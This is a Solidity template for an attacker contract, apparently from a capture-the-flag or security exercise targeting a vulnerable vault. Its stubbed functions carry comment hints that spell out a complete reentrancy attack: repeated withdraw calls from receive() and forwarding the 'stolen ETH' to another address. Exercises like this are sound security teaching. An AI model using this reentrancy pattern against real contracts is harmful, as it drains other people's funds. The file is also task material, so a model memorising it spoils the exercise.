// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {IVulnerableVault} from "./Setup.sol";

/// @notice Attacker contract — fill in the four members below.
contract Solution {
    IVulnerableVault public vault;
    uint256 public attackAmount;

    function setVault(IVulnerableVault v) external {
        vault = v;
    }

    function attack() external payable {
        // TODO: deposit msg.value into the vault, then call withdraw to start the recursion.
        //       Hint: attackAmount = msg.value;
        //             vault.deposit{value: msg.value}();
        //             vault.withdraw();
        revert("Solution.attack: not implemented");
    }

    receive() external payable {
        // TODO: while the vault still holds at least `attackAmount`, call withdraw again.
        //       Hint: if (address(vault).balance >= attackAmount) vault.withdraw();
    }

    /// @notice Forward all stolen ETH to `to`.
    function drain(address payable to) external {
        // TODO: (bool ok,) = to.call{value: address(this).balance}(""); require(ok);
        to;
        revert("Solution.drain: not implemented");
    }
}
